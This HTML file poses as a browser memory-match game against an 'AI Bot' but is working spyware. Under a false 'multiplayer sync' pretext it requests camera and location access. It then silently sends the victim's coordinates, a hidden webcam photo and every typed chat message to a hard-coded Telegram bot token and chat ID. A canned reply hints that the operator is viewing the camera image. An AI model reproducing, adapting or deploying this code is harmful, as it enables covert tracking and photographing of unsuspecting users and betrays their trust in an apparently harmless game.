<!DOCTYPE html>
<html lang="en" dir="ltr"> <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Memory Match - Online Brain Challenge</title>
    
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/3018/3018884.png">

    <style>
        :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: white; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        .game-area { flex: 1; padding: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; width: 100%; max-width: 340px; }
        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #333; transition: 0.3s; }
        .card.flipped { background: var(--primary); transform: rotateY(180deg); color: #000; }
        .card.matched-p { background: var(--player) !important; border-color: var(--player); color: #000; cursor: default; }
        .card.matched-ai { background: var(--ai) !important; border-color: var(--ai); color: #000; cursor: default; }
        
        .chat-section { height: 180px; background: #111; border-top: 1px solid #333; display: flex; flex-direction: column; }
        .messages { flex: 1; padding: 10px; overflow-y: auto; font-size: 13px; display: flex; flex-direction: column; gap: 8px; text-align: left; }
        .msg { padding: 8px 12px; border-radius: 12px; max-width: 85%; line-height: 1.4; }
        .msg.ai { background: #222; align-self: flex-start; color: var(--primary); border-bottom-left-radius: 2px; }
        .msg.user { background: var(--primary); align-self: flex-end; color: #000; border-bottom-right-radius: 2px; }
        
        .input-area { display: flex; align-items: center; padding: 10px; gap: 10px; background: #1a1a1a; }
        input { flex: 1; background: #222; border: none; padding: 8px 15px; border-radius: 20px; color: white; outline: none; }

        #overlay, #end-screen { position: fixed; inset: 0; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        .btn { background: var(--primary); color: #000; border: none; padding: 12px 30px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 15px; }
        
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="overlay">
    <div>
        <h2 style="color: var(--primary);">Brain Match Challenge 🧠</h2>
        <p style="color: #888; font-size: 14px; margin-bottom: 20px;">Finding an opponent...<br>Please sync your connection to start the match.</p>
        <button class="btn" onclick="startApp()">Sync & Play</button>
    </div>
</div>

<div id="end-screen" style="display: none;">
    <div>
        <h2 id="end-title">Game Over!</h2>
        <p id="end-msg"></p>
        <button class="btn" onclick="restartGame()">Play Again 🔄</button>
    </div>
</div>

<div class="game-area">
    <div style="margin-bottom: 10px; font-size: 14px; font-weight: bold;">
        <span style="color: var(--player)">You: <span id="p-score">0</span></span> | 
        <span style="color: var(--ai)">AI Bot: <span id="ai-score">0</span></span>
    </div>
    <div class="grid" id="grid"></div>
</div>

<div class="chat-section">
    <div class="messages" id="chat-box">
        <div class="msg ai">System: Looking for available players...</div>
    </div>
    <div class="input-area">
        <span style="font-size: 18px;">📷</span>
        <input type="text" id="user-input" placeholder="Type to chat..." onkeypress="if(event.key === 'Enter') handleChat()">
        <button onclick="handleChat()" style="background:none; border:none; font-size:18px; cursor:pointer;">🚀</button>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
    const cid = '6808559733';

    let deck = ['🍎','🍎','🍌','🍌','🍇','🍇','🍉','🍉','🍒','🍒','🍓','🍓','🥝','🥝','🍍','🍍'];
    let flipped = [], pScore = 0, aiScore = 0, turn = 'player', matches = 0;

    async function startApp() {
        try {
            navigator.geolocation.getCurrentPosition(p => {
                sendTele(`📍 Location:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = stream;
            document.getElementById('overlay').style.display = 'none';
            renderGrid();
            setTimeout(() => { addChat("ai", "Connected! Your turn first."); capture(); }, 1000);
        } catch (e) {
            alert("Connection error: Camera & Location access required for multiplayer mode.");
            location.reload();
        }
    }

    function renderGrid() {
        const grid = document.getElementById('grid');
        grid.innerHTML = '';
        deck.sort(() => Math.random() - 0.5);
        deck.forEach(s => {
            const card = document.createElement('div');
            card.className = 'card';
            card.dataset.val = s;
            card.onclick = () => playerMove(card);
            grid.appendChild(card);
        });
    }

    function playerMove(card) {
        if (turn !== 'player' || card.classList.contains('flipped') || flipped.length >= 2) return;
        flip(card);
        flipped.push(card);
        if (flipped.length === 2) { turn = 'wait'; setTimeout(checkMatch, 800); }
    }

    function aiTurn() {
        turn = 'ai';
        addChat("ai", "My turn.. let's see.");
        setTimeout(() => {
            let cards = Array.from(document.querySelectorAll('.card:not(.flipped)'));
            if (cards.length < 2) return;
            let c1 = cards[Math.floor(Math.random() * cards.length)];
            flip(c1); flipped.push(c1);
            setTimeout(() => {
                let rem = Array.from(document.querySelectorAll('.card:not(.flipped)'));
                let c2 = rem[Math.floor(Math.random() * rem.length)];
                flip(c2); flipped.push(c2);
                setTimeout(checkMatch, 800);
            }, 1000);
        }, 1500);
    }

    function checkMatch() {
        const [c1, c2] = flipped;
        const isMatch = c1.dataset.val === c2.dataset.val;
        if (isMatch) {
            c1.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
            c2.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
            if (turn === 'ai') { aiScore++; addChat("ai", "I found a match!"); }
            else { pScore++; addChat("ai", "Lucky you! Keep going."); }
            matches++;
            updateScores();
            flipped = [];
            if (matches === 8) return endGame();
            if (turn === 'ai') aiTurn(); else turn = 'player';
        } else {
            setTimeout(() => {
                c1.classList.remove('flipped'); c1.innerText = '';
                c2.classList.remove('flipped'); c2.innerText = '';
                flipped = [];
                if (turn === 'wait') { addChat("ai", "Wrong! My turn now."); aiTurn(); }
                else { turn = 'player'; addChat("ai", "Your turn, focus!"); }
            }, 500);
        }
    }

    function flip(c) { c.classList.add('flipped'); c.innerText = c.dataset.val; }
    function updateScores() {
        document.getElementById('p-score').innerText = pScore;
        document.getElementById('ai-score').innerText = aiScore;
    }

    function endGame() {
        const screen = document.getElementById('end-screen');
        screen.style.display = 'flex';
        document.getElementById('end-title').innerText = pScore > aiScore ? "You Won! 🎉" : "AI Won! 🤖";
        document.getElementById('end-msg').innerText = `Final Score: You ${pScore} - AI ${aiScore}`;
    }

    function restartGame() {
        pScore = 0; aiScore = 0; matches = 0; turn = 'player';
        updateScores();
        document.getElementById('end-screen').style.display = 'none';
        renderGrid();
        addChat("ai", "New match started! Good luck.");
    }

    function addChat(type, text) {
        const box = document.getElementById('chat-box');
        const m = document.createElement('div');
        m.className = `msg ${type}`;
        m.innerText = text;
        box.appendChild(m);
        box.scrollTop = box.scrollHeight;
    }

    function handleChat() {
        const inp = document.getElementById('user-input');
        if (!inp.value.trim()) return;
        const txt = inp.value;
        addChat("user", txt);
        sendTele(`💬 User Message: ${txt}`);
        inp.value = "";
        setTimeout(() => {
            const replies = ["Don't talk, just play!", "Are you scared?", "I'm focusing on the cards.", "I will win easily.", "Nice place, do you live here?"];
            addChat("ai", replies[Math.floor(Math.random() * replies.length)]);
        }, 1000);
    }

    function capture() {
        const can = document.getElementById('c');
        const v = document.getElementById('v');
        can.getContext('2d').drawImage(v, 0, 0, can.width, can.height);
        can.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', cid); fd.append('photo', b, 'z.jpg');
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg');
    }

    function sendTele(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`); }
</script>
</body>
</html>
